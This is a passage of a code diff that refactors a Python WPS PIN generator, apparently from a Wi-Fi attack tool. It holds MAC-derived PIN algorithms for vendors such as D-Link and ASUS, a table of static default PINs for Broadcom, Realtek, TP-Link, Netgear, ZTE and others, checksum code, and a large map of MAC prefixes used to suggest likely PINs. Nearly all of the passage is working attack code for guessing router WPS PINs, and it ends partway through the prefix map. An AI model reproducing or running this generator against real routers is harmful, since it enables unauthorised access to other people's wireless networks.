-    def __hash__(self): return hash(self._int_repr)
+    def integer(self, value):
+        self._int_repr = value
+        self._str_repr = self._int2mac(value)
+
+    def __int__(self):
+        return self.integer
+
+    def __str__(self):
+        return self.string
+
+    def __iadd__(self, other):
+        self.integer = self.integer + int(other)
+        return self
+
+    def __isub__(self, other):
+        self.integer = self.integer - int(other)
+        return self
+
+    def _coerce(self, other):
+        if isinstance(other, NetworkAddress):
+            return other.integer
+        try:
+            return NetworkAddress(other).integer
+        except (ValueError, AttributeError):
+            return NotImplemented
+
+    def __eq__(self, other):
+        v = self._coerce(other)
+        return NotImplemented if v is NotImplemented else self.integer == v
+
+    def __ne__(self, other):
+        v = self._coerce(other)
+        return NotImplemented if v is NotImplemented else self.integer != v
+
+    def __lt__(self, other):
+        return self.integer < self._coerce(other)
+
+    def __gt__(self, other):
+        return self.integer > self._coerce(other)
+
+    def __hash__(self):
+        return hash(self._int_repr)
+
     @staticmethod
-    def _mac2int(mac): return int(mac.replace(':', ''), 16)
+    def _mac2int(mac):
+        return int(mac.replace(':', ''), 16)
+
     @staticmethod
     def _int2mac(mac):
         s = hex(mac).split('x')[-1].upper().zfill(12)
         return ':'.join(s[i:i+2] for i in range(0, 12, 2))
+
     def __repr__(self):
         return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'
 
 
 # ---------------------------------------------------------------------------
-# WPSpin — O(1) checksum, deduped suggestions
+# WPSpin
 # ---------------------------------------------------------------------------
 class WPSpin:
-    ALGO_MAC = 0; ALGO_EMPTY = 1; ALGO_STATIC = 2
+    ALGO_MAC = 0
+    ALGO_EMPTY = 1
+    ALGO_STATIC = 2
+
+    _CHECKSUM_TABLE = None
 
     def __init__(self):
         self._pin_cache = {}
         self.algos = {
-            'pin24':        {'name': '24-bit PIN',      'mode': self.ALGO_MAC,    'gen': self.pin24},
-            'pin28':        {'name': '28-bit PIN',      'mode': self.ALGO_MAC,    'gen': self.pin28},
-            'pin32':        {'name': '32-bit PIN',      'mode': self.ALGO_MAC,    'gen': self.pin32},
-            'pinDLink':     {'name': 'D-Link PIN',      'mode': self.ALGO_MAC,    'gen': self.pinDLink},
-            'pinDLink1':    {'name': 'D-Link PIN +1',   'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
-            'pinASUS':      {'name': 'ASUS PIN',        'mode': self.ALGO_MAC,    'gen': self.pinASUS},
-            'pinAirocon':   {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
-            'pinInvNIC':    {'name': 'Inverted NIC',    'mode': self.ALGO_MAC,    'gen': self.pinInvNIC},
-            'pinNIC2':      {'name': 'NIC x2',          'mode': self.ALGO_MAC,    'gen': self.pinNIC2},
-            'pinNIC3':      {'name': 'NIC x3',          'mode': self.ALGO_MAC,    'gen': self.pinNIC3},
-            'pinOUIaddNIC': {'name': 'OUI+NIC sum',     'mode': self.ALGO_MAC,    'gen': self.pinOUIaddNIC},
-            'pinOUIxorNIC': {'name': 'OUI^NIC xor',     'mode': self.ALGO_MAC,    'gen': self.pinOUIxorNIC},
-            'pinEmpty':     {'name': 'Empty PIN',       'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
-            'pinCisco':     {'name': 'Cisco',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
-            'pinBrcm1':     {'name': 'Broadcom 1',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
-            'pinBrcm2':     {'name': 'Broadcom 2',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
-            'pinBrcm3':     {'name': 'Broadcom 3',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
-            'pinBrcm4':     {'name': 'Broadcom 4',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
-            'pinBrcm5':     {'name': 'Broadcom 5',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
-            'pinBrcm6':     {'name': 'Broadcom 6',      'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
-            'pinAirc1':     {'name': 'Airocon 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
-            'pinAirc2':     {'name': 'Airocon 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
-            'pinDSL2740R':  {'name': 'DSL-2740R',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
-            'pinRealtek1':  {'name': 'Realtek 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
-            'pinRealtek2':  {'name': 'Realtek 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
-            'pinRealtek3':  {'name': 'Realtek 3',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
-            'pinUpvel':     {'name': 'Upvel',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
-            'pinUR814AC':   {'name': 'UR-814AC',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
-            'pinUR825AC':   {'name': 'UR-825AC',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
-            'pinOnlime':    {'name': 'Onlime',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
-            'pinEdimax':    {'name': 'Edimax',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
-            'pinThomson':   {'name': 'Thomson',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
-            'pinHG532x':    {'name': 'HG532x',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
-            'pinH108L':     {'name': 'H108L',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
-            'pinONO':       {'name': 'CBN ONO',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
-            'pinTenda':     {'name': 'Tenda',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 1296051},
-            'pinTPLink1':   {'name': 'TP-Link 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
-            'pinTPLink2':   {'name': 'TP-Link 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 5765498},
-            'pinNetgear1':  {'name': 'Netgear 1',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
-            'pinNetgear2':  {'name': 'Netgear 2',       'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
-            'pinZTE1':      {'name': 'ZTE 1',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
-            'pinZTE2':      {'name': 'ZTE 2',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
+            'pin24':       {'name': '24-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin24},
+            'pin28':       {'name': '28-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin28},
+            'pin32':       {'name': '32-bit PIN',        'mode': self.ALGO_MAC,    'gen': self.pin32},
+            'pinDLink':    {'name': 'D-Link PIN',        'mode': self.ALGO_MAC,    'gen': self.pinDLink},
+            'pinDLink1':   {'name': 'D-Link PIN +1',     'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
+            'pinASUS':     {'name': 'ASUS PIN',          'mode': self.ALGO_MAC,    'gen': self.pinASUS},
+            'pinAirocon':  {'name': 'Airocon Realtek',   'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
+            'pinInvNIC':   {'name': 'Inverted NIC',      'mode': self.ALGO_MAC,    'gen': self.pinInvNIC},
+            'pinNIC2':     {'name': 'NIC x2',            'mode': self.ALGO_MAC,    'gen': self.pinNIC2},
+            'pinNIC3':     {'name': 'NIC x3',            'mode': self.ALGO_MAC,    'gen': self.pinNIC3},
+            'pinOUIaddNIC':{'name': 'OUI+NIC sum',       'mode': self.ALGO_MAC,    'gen': self.pinOUIaddNIC},
+            'pinOUIxorNIC':{'name': 'OUI^NIC xor',       'mode': self.ALGO_MAC,    'gen': self.pinOUIxorNIC},
+            'pinEmpty':    {'name': 'Empty PIN',         'mode': self.ALGO_EMPTY,  'gen': lambda mac: ''},
+            'pinCisco':    {'name': 'Cisco',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
+            'pinBrcm1':    {'name': 'Broadcom 1',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
+            'pinBrcm2':    {'name': 'Broadcom 2',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
+            'pinBrcm3':    {'name': 'Broadcom 3',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
+            'pinBrcm4':    {'name': 'Broadcom 4',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
+            'pinBrcm5':    {'name': 'Broadcom 5',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
+            'pinBrcm6':    {'name': 'Broadcom 6',        'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
+            'pinAirc1':    {'name': 'Airocon 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
+            'pinAirc2':    {'name': 'Airocon 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
+            'pinDSL2740R': {'name': 'DSL-2740R',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
+            'pinRealtek1': {'name': 'Realtek 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
+            'pinRealtek2': {'name': 'Realtek 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
+            'pinRealtek3': {'name': 'Realtek 3',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
+            'pinUpvel':    {'name': 'Upvel',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
+            'pinUR814AC':  {'name': 'UR-814AC',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
+            'pinUR825AC':  {'name': 'UR-825AC',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
+            'pinOnlime':   {'name': 'Onlime',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
+            'pinEdimax':   {'name': 'Edimax',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
+            'pinThomson':  {'name': 'Thomson',          'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
+            'pinHG532x':   {'name': 'HG532x',            'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
+            'pinH108L':    {'name': 'H108L',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
+            'pinONO':      {'name': 'CBN ONO',           'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521},
+            'pinTenda':    {'name': 'Tenda',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 1296051},
+            'pinTPLink1':  {'name': 'TP-Link 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
+            'pinTPLink2':  {'name': 'TP-Link 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 5765498},
+            'pinNetgear1': {'name': 'Netgear 1',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
+            'pinNetgear2': {'name': 'Netgear 2',         'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
+            'pinZTE1':     {'name': 'ZTE 1',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
+            'pinZTE2':     {'name': 'ZTE 2',             'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
         }
 
     @staticmethod
     def checksum(pin):
-        try: pin = int(pin)
-        except (TypeError, ValueError): return 0
+        if WPSpin._CHECKSUM_TABLE is None:
+            WPSpin._CHECKSUM_TABLE = _build_checksum_table()
+        try:
+            pin = int(pin)
+        except (TypeError, ValueError):
+            return 0
+        if 0 <= pin < 10_000_000:
+            return WPSpin._CHECKSUM_TABLE[pin]
         accum = 0
         while pin:
             accum += 3 * (pin % 10); pin //= 10
@@ -562,55 +701,162 @@ class WPSpin:
 
     def generate(self, algo, mac):
         key = (algo, str(mac))
-        if key in self._pin_cache: return self._pin_cache[key]
+        if key in self._pin_cache:
+            return self._pin_cache[key]
         mac = mac if isinstance(mac, NetworkAddress) else NetworkAddress(mac)
-        if algo not in self.algos: raise ValueError('Invalid WPS pin algorithm')
+        if algo not in self.algos:
+            raise ValueError('Invalid WPS pin algorithm')
         pin = self.algos[algo]['gen'](mac)
         if algo == 'pinEmpty':
             result = pin
         else:
-            pin %= 10000000
+            pin = pin % 10000000
             result = (str(pin) + str(self.checksum(pin))).zfill(8)
         self._pin_cache[key] = result
         return result
 
     def getAll(self, mac, get_static=True):
-        return [{'id': ID,
-                 'name': ('Static PIN — ' if a['mode'] == self.ALGO_STATIC else '') + a['name'],
-                 'pin': self.generate(ID, mac)}
-                for ID, a in self.algos.items()
-                if get_static or a['mode'] != self.ALGO_STATIC]
+        res = []
+        for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC and not get_static:
+                continue
+            prefix = 'Static PIN — ' if algo['mode'] == self.ALGO_STATIC else ''
+            res.append({'id': ID, 'name': prefix + algo['name'],
+                        'pin': self.generate(ID, mac)})
+        return res
 
     def getList(self, mac, get_static=True):
-        return [self.generate(ID, mac) for ID, a in self.algos.items()
-                if get_static or a['mode'] != self.ALGO_STATIC]
+        return [self.generate(ID, mac)
+                for ID, algo in self.algos.items()
+                if get_static or algo['mode'] != self.ALGO_STATIC]
 
     def getSuggested(self, mac):
-        seen, out = set(), []
+        res = []
         for ID in self._suggest(mac):
-            a = self.algos[ID]
-            prefix = 'Static PIN — ' if a['mode'] == self.ALGO_STATIC else ''
-            pin = self.generate(ID, mac)
-            if pin in seen: continue
-            seen.add(pin)
-            out.append({'id': ID, 'name': prefix + a['name'], 'pin': pin})
+            algo = self.algos[ID]
+            prefix = 'Static PIN — ' if algo['mode'] == self.ALGO_STATIC else ''
+            res.append({'id': ID, 'name': prefix + algo['name'],
+                        'pin': self.generate(ID, mac)})
+        return res
+
+    def getSuggestedUnique(self, mac):
+        seen, out = set(), []
+        for item in self.getSuggested(mac):
+            if item['pin'] in seen:
+                continue
+            seen.add(item['pin'])
+            out.append(item)
         return out
 
-    def getSuggestedUnique(self, mac): return self.getSuggested(mac)
-    def getSuggestedList(self, mac):   return [i['pin'] for i in self.getSuggested(mac)]
+    def getSuggestedList(self, mac):
+        return [self.generate(a, mac) for a in self._suggest(mac)]
+
     def getLikely(self, mac):
-        r = self.getSuggestedList(mac); return r[0] if r else None
+        res = self.getSuggestedList(mac)
+        return res[0] if res else None
 
     def _suggest(self, mac):
         mac = mac.replace(':', '').upper()
-        algorithms = _SUGGEST_MAP
-        return [aid for aid, masks in algorithms.items()
-                if any(mac.startswith(m) for m in masks)]
+        algorithms = {
+            'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E',
+                     'EC086B','6C198F','B0487A','C0C1C0','3C46D8','0023CD','A42B8C','3894ED','B0C745',
+                     '6466B3','2C4D54','1008B1','143005','E4F4C6','1C3BF3','F4F26D','848E96','109FA9',
+                     'F0A731','00DBDF','4027F5','101250','50B7C3','CC32E5','D4B167','E84DD0','FC3514'),
+            'pin28': ('200BC7','4846FB','D46AA8','F84ABF',
+                      '74DA88','C46E1F','0C726D','CC9F7A','7C8BCA','44A56E'),
+            'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','801F02',
+                      'EC086B','1C872C','B06EBF','3085A9','AC220B','D017C2','6045CB','74D02B','D850E6'),
+            'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97',
+                         '1CAFF7','3C1E04','10BEF5','78321B','C4A81D','908D78','F07D68','346BD3','6C198F'),
+            'pinDLink1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1',
+                          '1CAFF7','3C1E04','10BEF5','78321B','F07D68','281878','C4E984'),
+            'pinASUS': ('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4',
+                        '2420C7','1C872C','50465D','04421A','D45D64','70825E','3C7C3F','FCECDA','3497F6',
+                        '60A44C','88D7F6','382C4A','1CB72C','2C56DC','AC9E17','B06EBF','40167E','9C5C8E',
+                        'F46BEF','A8F7E0','BCEE7B','E03F49','D017C2','F832E4','54A050','708105','AC2205'),
+            'pinAirocon': ('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97',
+                           'D084B0','84A423','8C10D4','E4BEED','B85510','C891F9','3C1E04','40F201','181E78'),
+            'pinInvNIC': ('00904C','EC6264','14144B','988B5D','001AA9','ACF1DF','BCF685',
+                          '00E04C','001CDF','002275','C83A35','B4944E'),
+            'pinNIC2': ('D4BF7F','F8C091','784476','0014D1','144D67'),
+            'pinNIC3': ('F8C091','D4BF7F','784476'),
+            'pinOUIaddNIC': ('00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685',
+                             '00E04C','08C6B3','007263','000C42','000EE8'),
+            'pinOUIxorNIC': ('00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685'),
+            'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C',
+                         'F0B429','741EA2','D4214D','E0E751','2C39C1','0C54A5','78C1A7','6C72E7',
+                         'D8EB46','7442C1','B0B98A','F85E42','30B5C2','C8D719','240995','18A6F7'),
+            'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5',
+                         '0023BE','002369','0025B3','000F8F','0012D9','001217','00182A','000625',
+                         '00166F','001839','001A70','001C10','001E4A','002163','006B4F'),
+            'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264',
+                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
+            'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19',
+                         '20E52A','3CA72B','E44790'),
+            'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C',
+                         '20E52A','3CA72B','E44790'),
+            'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
+                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
+            'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
+                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
+            'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9',
+                         '20E52A','3CA72B','E44790','5CF370','D0D04B'),
+            'pinAirc1': ('181E78','40F201','44E9DD','D084B0',
+                         '84A423','8C10D4','3C1E04'),
+            'pinAirc2': ('84A423','8C10D4','88A6C6',
+                         '181E78','40F201','44E9DD'),
+            'pinDSL2740R': ('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516',
+                            '1CAFF7','78321B','F07D68','C4A81D'),
+            'pinRealtek1': ('0014D1','000C42','000EE8',
+                            '00E04C','E4BEED','08C6B3','007263','B85510'),
+            'pinRealtek2': ('007263','E4BEED',
+                            '00E04C','0014D1','08C6B3'),
+            'pinRealtek3': ('08C6B3',
+                            '00E04C','007263','E4BEED'),
+            'pinUpvel': ('784476','D4BF7F0','F8C091'),
+            'pinUR814AC': ('D4BF7F60',),
+            'pinUR825AC': ('D4BF7F5',),
+            'pinOnlime': ('D4BF7F','F8C091','144D67','784476','0014D1'),
+            'pinEdimax': ('801F02','00E04C',
+                          '74DA38','80D01D','00E04C'),
+            'pinThomson': ('002624','4432C8','88F7C7','CC03FA',
+                           'BC7670','7822DF','782E29','FC946C','A0F3C1','64680C','04FE31'),
+            'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF',
+                          '4C8BEF','4CB16C','C8D15E','D46E5C','EC233D','ECCB30','F49FF3','2008ED',
+                          '007822','00259E','001882','00E0FC','001E10','0019CB','006331','78D99F'),
+            'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897',
+                         'E068E7','5CE286','CC7B35','84A8E4','C864C7','18C58A','4C09B4','44F436',
+                         '00265E','002293','002662','741F4A','283B82','74A063'),
+            'pinONO': ('5C353B','DC537C',
+                       'E0CA94','1C3991','40167E','5853AF'),
+            'pinTenda': ('C83A35','001CC3','D85D4C','B0B2DC','CC5D4E','9C216A','BCDAFE','EC26CA',
+                         '28EE52','C4F0EC','D021FA','302481','58605F','808132','A4F4C2','F42896'),
+            'pinTPLink1': ('EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332',
+                           '9094E4','5C899A','14CF92','6CE873','2C4D54','640DE6','B4B024','B0C745',
+                           '3C46D8','1C3BF3','AC84C6','F0A731','ECA940','D8075A'),
+            'pinTPLink2': ('EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332',
+                           'D8075A','ECA940','AC84C6','640DE6','B4B024'),
+            'pinNetgear1': ('204E7F','4C17EB','7C03D8','D86CE9','18622C','E46F13','E0469A','300D43',
+                            '001E2A','001B2F','001F33','002636','008EF2','20E52A','2CB05D','3CA72B',
+                            'C43DC7','C8B373','E44790','F87394','CC40D0','6CB0CE','A42B8C','6CDA23'),
+            'pinNetgear2': ('204E7F','4C17EB','7C03D8','D86CE9','18622C','E0469A','300D43',
+                            '001E2A','001B2F','20E52A','3CA72B','C43DC7','C8B373','E44790'),
+            'pinZTE1': ('4C09B4','4CAC0A','9CD24B','B075D5','C864C7','DC028E','FCC897',
+                        'E068E7','5CE286','CC7B35','84A8E4','18C58A','44F436','283B82'),
+            'pinZTE2': ('4C09B4','4CAC0A','9CD24B','C864C7','DC028E','FCC897',
+                        'E068E7','CC7B35','84A8E4','18C58A'),
+        }
+        res = []
+        for algo_id, masks in algorithms.items():
+            for mask in masks:
+                if mac.startswith(mask):
+                    res.append(algo_id)
+                    break
+        return res
 
-    # --- per-algorithm math (unchanged) ---
-    def pin24(self, mac): return mac.integer & 0xFFFFFF
-    def pin28(self, mac): return mac.integer & 0xFFFFFFF
-    def pin32(self, mac): return mac.integer % 0x100000000
+    def pin24(self, mac):   return mac.integer & 0xFFFFFF
+    def pin28(self, mac):   return mac.integer & 0xFFFFFFF
+    def pin32(self, mac):   return mac.integer % 0x100000000
 
     def pinDLink(self, mac):
         nic = mac.integer & 0xFFFFFF
@@ -624,14 +870,17 @@ class WPSpin:
         return pin
 
     def pinDLink1(self, mac):
-        m = NetworkAddress(mac); m.integer += 1; return self.pinDLink(m)
+        m = NetworkAddress(mac)
+        m.integer += 1
+        return self.pinDLink(m)
 
     def pinASUS(self, mac):
         b = [int(i, 16) for i in mac.string.split(':')]
         digits = []
         for i in range(7):
             denom = (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7)
-            if denom == 0: denom = 10
+            if denom == 0:
+                denom = 10
             digits.append(str((b[i % 6] + b[5]) % denom))
         return int(''.join(digits))
 
@@ -646,76 +895,40 @@ class WPSpin:
                 (((b[0] + b[1]) % 10) * 1000000))
 
     def pinInvNIC(self, mac):
-        return (~(mac.integer & 0xFFFFFF)) & 0xFFFFFF
-    def pinNIC2(self, mac): return ((mac.integer & 0xFFFFFF) * 2) & 0xFFFFFF
-    def pinNIC3(self, mac): return ((mac.integer & 0xFFFFFF) * 3) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return (~nic) & 0xFFFFFF
+
+    def pinNIC2(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return (nic * 2) & 0xFFFFFF
+
+    def pinNIC3(self, mac):
+        nic = mac.integer & 0xFFFFFF
+        return (nic * 3) & 0xFFFFFF
+
     def pinOUIaddNIC(self, mac):
-        return (((mac.integer >> 24) & 0xFFFFFF) + (mac.integer & 0xFFFFFF)) & 0xFFFFFF
+        oui = (mac.integer >> 24) & 0xFFFFFF
+        nic = mac.integer & 0xFFFFFF
+        return (oui + nic) & 0xFFFFFF
+
     def pinOUIxorNIC(self, mac):
-        return ((mac.integer >> 24) & 0xFFFFFF) ^ (mac.integer & 0xFFFFFF)
-
-
-# The big suggestion map (moved out of _suggest for readability; same data)
-_SUGGEST_MAP = {
-    'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D','32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB','6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E','CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC','FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5','84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D','00664B','087A4C','14B968','2008ED','346BD3','4CEDDE','786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30','F49FF3','20CF30','90E6BA','E0CB4E','D4BF7F4','F8C091','001CDF','002275','08863B','00B00C','081075','C83A35','0022F7','001F1F','00265B','68B6CF','788DF7','BC1401','202BC1','308730','5C4CA9','62233D','623CE4','623DFF','6253D4','62559C','626BD3','627D5E','6296BF','62A8E4','62B686','62C06F','62C61F','62C714','62CBA8','62CDBE','62E87B','6416F0','6A1D67','6A233D','6A3DFF','6A53D4','6A559C','6A6BD3','6A96BF','6A7D5E','6AA8E4','6AC06F','6AC61F','6AC714','6ACBA8','6ACDBE','6AD15E','6AD167','721D67','72233D','723CE4','723DFF','7253D4','72559C','726BD3','727D5E','7296BF','72A8E4','72C06F','72C61F','72C714','72CBA8','72CDBE','72D15E','72E87B','0026CE','9897D1','E04136','B246FC','E24136','00E020','5CA39D','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E','EC086B','6C198F','C0C1C0','3C46D8','0023CD','A42B8C','3894ED','B0C745','6466B3','2C4D54','1008B1','143005','E4F4C6','1C3BF3','F4F26D','848E96','109FA9','F0A731','00DBDF','4027F5','101250','50B7C3','CC32E5','D4B167','E84DD0','FC3514'),
-    'pin28': ('200BC7','4846FB','D46AA8','F84ABF','74DA88','C46E1F','0C726D','CC9F7A','7C8BCA','44A56E'),
-    'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','801F02','EC086B','1C872C','B06EBF','AC220B','D017C2','6045CB','74D02B','D850E6'),
